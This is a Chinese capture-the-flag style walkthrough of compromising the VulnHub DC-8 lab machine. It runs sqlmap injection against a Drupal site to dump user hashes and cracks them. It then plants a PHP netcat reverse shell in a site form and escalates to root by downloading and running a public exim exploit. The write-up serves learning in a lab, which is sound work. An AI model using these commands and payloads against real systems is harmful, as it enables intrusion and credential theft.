# 基本配置

靶机是VulnHub上下载的DC 8：

![1604473753_5fa253990b02f117a1637.png!small](https://image.3001.net/images/20201104/1604473753_5fa253990b02f117a1637.png!small)

攻击机使用Kali2020.3，网络配置如下：

![1604473758_5fa2539ed1dc78b3c759e.png!small](https://image.3001.net/images/20201104/1604473758_5fa2539ed1dc78b3c759e.png!small)

# 信息搜集

启动靶机后，第一件事先扫描虚拟网段192.168.187.0/24：

![1604473762_5fa253a255c034ecf9688.png!small](https://image.3001.net/images/20201104/1604473762_5fa253a255c034ecf9688.png!small)

发现靶机192.168.187.141，进一步进行扫描：

![1604473766_5fa253a631920fe651cd4.png!small](https://image.3001.net/images/20201104/1604473766_5fa253a631920fe651cd4.png!small)

暂时没有更多的收获，接下来先访问网站<http://192.168.187.141>:

![1604473772_5fa253ac6ad90eb79b22b.png!small](https://image.3001.net/images/20201104/1604473772_5fa253ac6ad90eb79b22b.png!small)

是已经见过好几次的老熟人Drupal，可以看到网站首页的维护信息。

用dirb枚举网站目录，找到用户登录界面<http://192.168.187.141/user>：

![1604473777_5fa253b17c28b5ad6b67d.png!small](https://image.3001.net/images/20201104/1604473777_5fa253b17c28b5ad6b67d.png!small)

点击侧边栏的Welcome to DC-8发现这个URL似乎有点不一样：

![1604473781_5fa253b5f3c6dc0a11c25.png!small](https://image.3001.net/images/20201104/1604473781_5fa253b5f3c6dc0a11c25.png!small)

![1604473786_5fa253bad679f3d2a21e9.png!small](https://image.3001.net/images/20201104/1604473786_5fa253bad679f3d2a21e9.png!small)

打个单引号看看有没有SQL注入：

![1604473791_5fa253bfb29e3baa97682.png!small](https://image.3001.net/images/20201104/1604473791_5fa253bfb29e3baa97682.png!small)

有！接下来就从这里进行突破。

# SQL注入

先使用sqlmap探测有哪些数据库存在：

    
    
    sqlmap -u 192.168.187.141/?nid=1 --dbs --batch --risk 3 --level 5

![1604473800_5fa253c83c6a24c5aeb33.png!small](https://image.3001.net/images/20201104/1604473800_5fa253c83c6a24c5aeb33.png!small)

很明显d7db是我们的目标（不知道为啥不是d8dc），继续探测该数据库的表项：

    
    
    sqlmap -u 192.168.187.141/?nid=1 -D d7db --tables --batch --risk 3 --level 5

![1604473804_5fa253ccd945b4b5dc76e.png!small](https://image.3001.net/images/20201104/1604473804_5fa253ccd945b4b5dc76e.png!small)

发现users表，继续探测users表中的字段：

    
    
    sqlmap -u 192.168.187.141/?nid=1 -D d7db -T users --columns --batch --risk 3 --level 5

![1604473809_5fa253d19295d1e8c55e9.png!small](https://image.3001.net/images/20201104/1604473809_5fa253d19295d1e8c55e9.png!small)

看到pass字段即可确认，这就是此行的目标，那么接下来把这个表dump下来：

    
    
    sqlmap -u 192.168.187.141/?nid=1 -D d7db -T users --dump --batch --risk 3 --level 5

![1604473816_5fa253d832a14e7ea8c0c.png!small](https://image.3001.net/images/20201104/1604473816_5fa253d832a14e7ea8c0c.png!small)

找到两个用户admin和john以及两个密码的hash值，把hash值先存在passHash.txt文件中，用john the ripper碰碰运气：

    
    
    sudo john passHash.txt -show

![1604473821_5fa253ddf22918da55c9c.png!small](https://image.3001.net/images/20201104/1604473821_5fa253ddf22918da55c9c.png!small)

其中一个用户的密码是turtle，经过尝试发现这时john的密码：

![1604473826_5fa253e2b9d9681623565.png!small](https://image.3001.net/images/20201104/1604473826_5fa253e2b9d9681623565.png!small)

# 进入靶机

根据以往的经验，既然进入了网站，那么就可以通过在网页中嵌入一段脚本的方法来反弹shell。又由于Drupal使用的脚本语言是PHP，那么基本确定了下一步要做的就是嵌入一个PHP脚本来反弹shell了。

首先看看最醒目的Add content选项，看看可不可以添加php脚本：

![1604473835_5fa253ebd60b286d73aa7.png!small](https://image.3001.net/images/20201104/1604473835_5fa253ebd60b286d73aa7.png!small)

很遗憾的是这里被限制为只能编制纯文本的形式，无法编写脚本。

但是经过搜索，发现在如下图所示的界面可以编辑php脚本：

![1604473841_5fa253f1773c24a3cf20e.png!small](https://image.3001.net/images/20201104/1604473841_5fa253f1773c24a3cf20e.png!small)

注意这里有个小问题，在嵌入的php脚本前必须加入一小段话，不然这个php脚本将不会得到执行（参考[https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjG3671lOjsAhUdyosBHX6vBw4QFjACegQIARAC&url=https%3A%2F%2Fblog.mzfr.me%2Fvulnhub-writeups%2F2019-09-5-DC8&usg=AOvVaw2-LnYLzVO7SaA2WLyqCo0p](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjG3671lOjsAhUdyosBHX6vBw4QFjACegQIARAC&url=https%3A%2F%2Fblog.mzfr.me%2Fvulnhub-writeups%2F2019-09-5-DC8&usg=AOvVaw2-LnYLzVO7SaA2WLyqCo0p)）。

那么下面就编辑一段简单的脚本，使用nc反弹一个shell：

    
    
    <?php  
    system("nc -e /bin/bash 192.168.187.130 4444");  
    ?>

![1604473852_5fa253fc3e62b3f9e0f2e.png!small](https://image.3001.net/images/20201104/1604473852_5fa253fc3e62b3f9e0f2e.png!small)

保存后先在Kali上监听4444端口：

    
    
    nc -lvp 4444

然后在Contact Us界面随便提交点内容，即可得到反弹的shell：

![1604473858_5fa254026532873fe25f1.png!small](https://image.3001.net/images/20201104/1604473858_5fa254026532873fe25f1.png!small)

# 提权

先用python切换到一个交互式的shell环境：

    
    
    python -c 'import pty; pty.spawn("/bin/bash")' 

接下来先收集一些基本的信息：

![1604473864_5fa25408152793bd18ac2.png!small](https://image.3001.net/images/20201104/1604473864_5fa25408152793bd18ac2.png!small)

可以看到这是一个比较正常的环境。再看看/home目录下有没有有价值的信息，结果只有一个空的dc8user目录：

![1604473867_5fa2540be6e71d1d300aa.png!small](https://image.3001.net/images/20201104/1604473867_5fa2540be6e71d1d300aa.png!small)

那么接下来就正式考虑提权的问题，首先看看有没有可以已root权限执行的命令：

    
    
    find / -user root -perm -4000 -print 2>/dev/null

![1604473872_5fa25410d0460cd10a7dc.png!small](https://image.3001.net/images/20201104/1604473872_5fa25410d0460cd10a7dc.png!small)

有个exim4比较奇怪，先记录下来。

接着看看有没有免密码sudo的命令：

    
    
    sudo -l

![1604473877_5fa25415870f5843468e6.png!small](https://image.3001.net/images/20201104/1604473877_5fa25415870f5843468e6.png!small)

结果根本无法查看。

最后看看有没有内核漏洞：

    
    
    uname -a  
    searchsploit 4.9.0-4

![1604473882_5fa2541a2f5af399a97ee.png!small](https://image.3001.net/images/20201104/1604473882_5fa2541a2f5af399a97ee.png!small)

结果无功而返：

![1604473888_5fa25420298e5b0ddb7e6.png!small](https://image.3001.net/images/20201104/1604473888_5fa25420298e5b0ddb7e6.png!small)

那么只有把精力集中在exim4上了，看了看命令发现exim4应该是exim的4版本。

先看看靶机上的exim4具体版本是多少：

![1604473893_5fa2542587a4125b889af.png!small](https://image.3001.net/images/20201104/1604473893_5fa2542587a4125b889af.png!small)

搜索一下exploit：![1604473899_5fa2542b42018df86eea1.png!small](https://image.3001.net/images/20201104/1604473899_5fa2542b42018df86eea1.png!small)

一眼就能看到有几个 Local Privilege Escalation，选择如下这个exploit：

![1604473924_5fa254447085f014e095e.png!small](https://image.3001.net/images/20201104/1604473924_5fa254447085f014e095e.png!small)

将这个exploit拷贝到dc8目录下，并在该目录开启一个简单的http服务：

    
    
    cp /usr/share/exploitdb/exploits/linux/local/46996.sh dc8  
    python -m SimpleHTTPServer # 用python开启一个简单的http服务器

来到靶机的/tmp目录下，使用wget下载46996.sh脚本：

    
    
    cd /tmp  
    wget http://192.168.187.130:8000/46996.sh

![1604473930_5fa2544a935f04ea23400.png!small](https://image.3001.net/images/20201104/1604473930_5fa2544a935f04ea23400.png!small)

先更改脚本的权限使其可执行：

    
    
    chmod 777 46996.sh

根据脚本的提示，执行以下指令进行提权：

    
    
    bash ./46996.sh -m netcat

结果出现了问题：

![1604473938_5fa2545228dc434c4e828.png!small](https://image.3001.net/images/20201104/1604473938_5fa2545228dc434c4e828.png!small)

看了一下问题，发现是因为出现了Windows平台下的换行符“\r"，那就先在Kali上用vi将文件格式强制改成Unix格式：

    
    
    vi 46996.sh  
    :set ff? # 查询文件格式  
    :set ff=unix # 将文件格式改成Unix格式

此时应该就可以执行这个脚本了，重新下载、执行脚本：

![1604473943_5fa2545704491a4bbacbd.png!small](https://image.3001.net/images/20201104/1604473943_5fa2545704491a4bbacbd.png!small)

得到root权限。前往/root目录，读取flag：

![1604473949_5fa2545d3c16a6f4f656b.png!small](https://image.3001.net/images/20201104/1604473949_5fa2545d3c16a6f4f656b.png!small)

# 总结

总结一下这次DC8的入侵实战

学到的知识：

> 进一步熟悉了sqlmap的操作
>
> 熟悉了john the ripper的操作
>
> 对提权的过程更加熟悉，有了自己的一套方法

还需进一步学习的知识：

> 对SQL注入不是很敏感，需要进一步熟悉其表现

